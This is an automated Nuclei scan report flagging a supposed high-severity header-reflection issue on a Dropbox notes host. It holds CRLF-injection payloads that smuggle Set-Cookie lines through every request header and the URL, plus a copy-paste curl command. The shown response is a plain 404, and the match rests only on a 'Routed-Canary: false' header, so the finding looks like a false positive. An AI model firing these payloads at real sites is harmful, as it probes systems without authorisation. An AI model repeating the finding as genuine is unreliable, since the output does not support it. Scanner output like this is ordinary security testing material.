### Looking for reflected values from request headers (header-reflection) found on https://notes.dropbox.com

----
**Details**: **header-reflection** matched at https://notes.dropbox.com

**Protocol**: HTTP

**Full URL**: https://paper.dropbox.com/%0D

**Timestamp**: Sat Dec 9 14:39:40 +0000 UTC 2023

**Template Information**

| Key | Value |
| --- | --- |
| Name | Looking for reflected values from request headers |
| Authors | panch0r3d |
| Tags |  |
| Severity | high |

**Request**
```http
GET /%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.notes.dropbox.com HTTP/1.1
Host: notes.dropbox.com
User-Agent: Mozilla Canary12345%0d%0ASet-Cookie: CanaryCookie=12345UA; path=/; secure; httponly
Connection: close
Accept: */*
Accept-Language: en
Cookie: Canary12345=qwerty%0d%0ASet-Cookie: CanaryCookie=12345CK; path=/; secure; httponly; t=jMVrmdEZlFZt4EIatQa2qYUb
Origin: Canary123456.com%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly
Referer: google.com%0d%0ASet-Cookie: CanaryCookie=12345R; path=/; secure; httponly
X-Forwarded-For: 0.0.0.0%0d%0ASet-Cookie: CanaryCookie=12345XF; path=/; secure; httponly
x-request-id: 123456%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 404 Not Found
Connection: close
Transfer-Encoding: chunked
Content-Security-Policy: sandbox; frame-ancestors 'self';
Content-Type: text/html
Date: Sat, 09 Dec 2023 14:39:39 GMT
Referrer-Policy: origin
Routed-Canary: false
Strict-Transport-Security: max-age=31557600; includeSubdomains;
X-Content-Type-Options: nosniff
X-Dropbox-Request-Id: 27db3fd52709619d11ef57a81a5e33bc
X-Frame-Options: SAMEORIGIN
X-Notes-Routing-Method: router-not-found
X-Paper-Request-Id: 567dfda9-1bb1-4571-b2d3-fda263e7ef31
X-Permitted-Cross-Domain-Policies: master-only
X-Robots-Tag: noindex, nofollow, noimageindex
X-Xss-Protection: 1; mode=block

<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Dropbox Paper - 404</title>
  <link href='//fonts.googleapis.com/css?family=Open+Sans:700,600,400' rel='stylesheet' type='text/css'>
</head>

<body style="font-family: 'Open Sans', 'lucida grande', 'Segoe UI', arial; color: #444; font-size: 16px; font-weight: normal; text-align: center; margin: 0; padding: 0;">
  <div style="position: absolute; height: 500px; width: 800px; top: 50%; left: 50%; margin-top: -250px; margin-left: -400px; font-weight: 200; text-align: center;">
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOAAAADgCAMAAAAt85rTAAACoFBMVEX///8jHyAjHyAjHyAjHyAjHyAjHyAjHyAjHyAjHyAjHyAjHyAjHyAjHyAjHyAjHyAjHyD7z2H7z2H7z2H7z2H7z2H7z2H7z2H7z2EtJyNXSTD7z2H7z2H7z2H7z2H7z2GqjUlYSjD7z2H7z2Gsj0lFOyr7z2HrwlzeuFi2l0wrJiM9NCjSrlXFo1FjUzNVSC/txF1ANikvKSQkICCcgkQwKSSVfEKPd0Ceg0XguVmBbDy3mE3Bn09LPyyNdUDov1tRRC6Ebj3VsFa5mU2qjUndtlhYSjBzYTh+aTvIplLYs1d/ajx7ZztIPSs0LSWLdD+Zf0M6MidmVjSqlGE9Ni09NSlLQzlZVlddTjElICEwLC3j4+NMR0aVfEInIiE3MCasq6u6ubmRj4+enZ1nZGXPq1QtJyM5MSdtWzY2LyYmIiHIx8fx8fH///+Df31LQzcwKyrGrG88MyediFt1cnP/+eyBbUGrnoD94ZzuynD+9uIwKyjTs2VZVFDiy5X70mtTRi+ek3zW1dX824m5sJ796rv+89idj3F0aFL96rr81XU+OjtMSEmspZmDgYH95Kb//PaQioHHwLHizp5hVDz83pNZTjz70mz957Csp5/+7cRmWD1LQTDVxqXIxcBWSC+qkltYSzPx7ulZTTesqaWso5OCc1bFo1Hx699nW0Y7MiesoYwqJSLRrFRnYlyjh0aBbkUsJyN0ZUdZTTrj2MHW0MZnX1OQgWOQhG10a1lZU0vCoVBLR0QvKSRLQC6qlmiQg2jw5szUwZVZUESdjGbGp2B+ajwmISHiulkzLCVaTDFOQi2IcT40LSU3MCZBNymLdD/OqlMpJCLNqlNXSTA3MCaWfUMwKSTsw1xBOCmukErpwVxZSzApJCIwKSSwkkrrpIC8AAAA4HRSTlMAQLCQ0P9gMOAggMAQ8KBwUIBgEHAg8P+Q/H5AwFCwoNSU0OBYmDDTeZjI////+tD/8P7x///u/0r///+y/9y18+hb0P/k///4zMjg2HTifPf7////////8OL///+I9ff//////56XspKe9P/////////9//////////////////f/////4P//////////////////9///8f/////////7/////////7///9j/+PP/7P/7////////////9P/c//////////+m84jywaA80GqCH+bWTKjUzu7i4N/E6+aILqEzAWgAABsGSURBVHgB7NdLjp0wEIbRAnwwLwN57X+rUdIRSl/daU9KPjv4Br9cji/UdV3XdV3XdV3XdcM4RWJTwRxpVbAMw7BGSpvHnjJx91COyKcBBZSadIKPdh6RywSWujW0RolcFrBHHAU7rkgFqBFRC9COfIEl/po1GCOTEVp82DawD5HGcYH4ZwDMye6Y/ek9maBGEje44nHdAyxXJHHCHf8rIFXh+ea4aWuksDbaHZ9cYIoMjoLy0nzt4EwRaMP8bpjUSMCN/TW7gT1D4Tq9CYzaaKM1Elgwv30faxtrghF++iF9+/4j4uevjxmehRTP4GKLP35TZy+qjdxQAIaPm3Wa2LlJMzq/Wp2RWqlVb9u+/+OVaEjIbHbTwrrU+QAJMLcf6WDEBJkUlYiXWWT33f7D8fsU5J27fwy8k0c2GyySoSxB5If9j6JQm5f3a7wfftr/3GUukgGyLKBgLvyiSzSA0sfVfad+xR5ufOoiDoDsWAUPMdMqVUG9vB9TkNXkXHA0kfwYOANgQAFaTAw9CVB7pb6bwC6rGdTBJMOiS1J8gwJgiUFjodFCV/r5p8kweemTpM4qiIhvc6G6ChAW72MDUAabCtTCLP6s66bo178DD0RRoxHbevMyORQgFkjiWwndp1QYZpkjQBHXp0XOlVGCEIpJB1QawGIwyxKmTJEGTiI5ALRZ5gow1x7NpYj5yfkU5GylSsWpTQrap2xAVrCUQgbtBZwYNBpAUUAXkYB2ceAmYIpnmZhmN8lUQd2UAIqyeJ6YAjUzxnClFTXFicgE2hswA16TnJ0wKbh1x2dKBdDCoLpujaEytAjWoASRWKABvpWau7fH6PMK7LNiUmigkxEiKM90tNrCELvyUpEK0AzAPIC5qcnZSEtPEkEFAB+UGVR5wQM0BpPICkuN2kUBcE6zmQRTwE09yJmoMDsAARQrPInPUYVnFMcTK7SmlUFrmlIK4gHwmSRnIKQARE9zVVE2FGjGFlFZWWarxvVnxWUPrcv/b0FZmcG2UBVQYYvCF5k2QENliWXucgZmVBkaT1pcGBSgN7ZmXlCeNFrDJgNSo5SZJJL/deTNjZxed0FJEayCLRVWpbzsMd7QPEBWgJiYvQIlmYHl4tv8D1m765v7ncju/ur2eHF/fbE/HI7fHB7kZEKQBMZQFV5TPqsxpMizljpDdBH84hJvBF4fDpfjC/ntWDeu7q7l6/VZBm18QQGg8gYrgPeVlfLMdZGqk3zOtyIX+zcdThEYRSSUENoXytQAcAVWUXmh5JlVntQiNKWwUsiTl0zxXZJs3NxtT23rw+PycILAJBItirjZ+FSdtqWQtL2+s8vCShuq0IwMQO8ZLOIikER9D+vE7Q7Hw93t/g1XcvV4fLubr+4jBSBJyKxeD6FCjAyv84DKKsJWEAcNUCBPKdQuIpcvyz5sR27dD7vdndwfH+QEDE0KmhNk45kyFGUwA9B1eUUVoPbKliu8UEXS8tvv+8873h+PF3J5d7kbp3YyVPLiolYBMjiRDOjaQjCGyqZd2ehxk7NVAAOIqdX4xyeTdnt7vD1cXx7uR9WpBd8Zb/SQ1i5ab4ACMEOTyisGGKsGUJ3BM3VsBAPIrvLxz49/7Tfubq6v5T/k6KiHBFb4m7ezcHMcSc94zWx/3TsN2SlBvbqI8lQ9jx5o+Tllz47P7Tjo2MfQB8u70zPLMz5mvtljZoYwMycXZubk74lVkmXJtrrdtvt+y2i9/r76qErVYirGMiTgyNKaU2dnRR8aqVDBYlrg/l3PphJX76TLuxe8LWVy18/sZszGDuX5BsqEfgg4CkLUCpV8cbbUIRTJ999NU56zza7ss4smAFSoBZZsZ0jUEsw/vxKYwUHA5/4rNFtEhy0a8yxq/UD7uey7QbF+KgisjZ9HKC7ySNw5ojHdH+wR0eEPJZb53Zm5QQEiVMixfIEpCqsjRJ75kKJ++EdI86Psx378uRBpYjIDxrjJLpIQQFD1I6/UsapArGBXgUU0KKPJs49FyCwwFlysQDsUgCxq46DylMrGAtS5ZBU0e6Rdsw/hu4wZCBgLfHah2I6ju3gnqHl6XpOxFyKt6rcgK+b7iQGROhwm+VjO4MIRjuAR04TGRc2XhDsfAJVEjo9VsQA/xJT4ec9vNCED5Ajb9AFYSoQRc2zjYkyJVOGMKClgsWICg1XxgEBhSpsGWTYRYpJR09+ZLnP1uO0i4mkUesxXAGTJG5UrwM1VVSnU0aRDGFZ5DUSu0Hv8BgLXNS9mwATPMUMnivTDbShW1pA0OgiZQE4gwbkuWLkLQEfScNMqtZ0Cm3Fowg2l90YfaB4li74LCyWe/4L2C5/9Ingvppd0Xnrp0g5zrP3NdkgsRAVZlIwr2k8BcXNA1ESPDpv9drvbwUIaLRq8jIYvpyp7d9LWdqrxro2MCBnTxaJcNDWCEliFIaUMu5RzjBwH0hfQxO0BZRzSQg7uou8ZG3RduG0KF9MkLziHhq9coXUGpOvoV7ySWpnUdsm4ChktmnA3ncb2+k2EkUvy9O8Yk1iHJDXMq15NRPfQhGFjzqsTKrj3PjqFre29vR2WLsoV20Vf+A5KRB5WxxMYUIX7H3iQjl9OnU4DVY6JBu12oz.... Truncated ....
```

**Extra Information**

**Extracted results:**

- Routed-Canary: false



**CURL command**
```sh
curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: Canary12345=qwerty%0d%0ASet-Cookie: CanaryCookie=12345CK; path=/; secure; httponly; t=jMVrmdEZlFZt4EIatQa2qYUb' -H 'Origin: Canary123456.com%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly' -H 'Referer: google.com%0d%0ASet-Cookie: CanaryCookie=12345R; path=/; secure; httponly' -H 'User-Agent: Mozilla Canary12345%0d%0ASet-Cookie: CanaryCookie=12345UA; path=/; secure; httponly' -H 'X-Forwarded-For: 0.0.0.0%0d%0ASet-Cookie: CanaryCookie=12345XF; path=/; secure; httponly' -H 'x-request-id: 123456%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly' 'https://notes.dropbox.com/%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.notes.dropbox.com'
```

----

Generated by [Nuclei v3.1.0-dev](https://github.com/projectdiscovery/nuclei)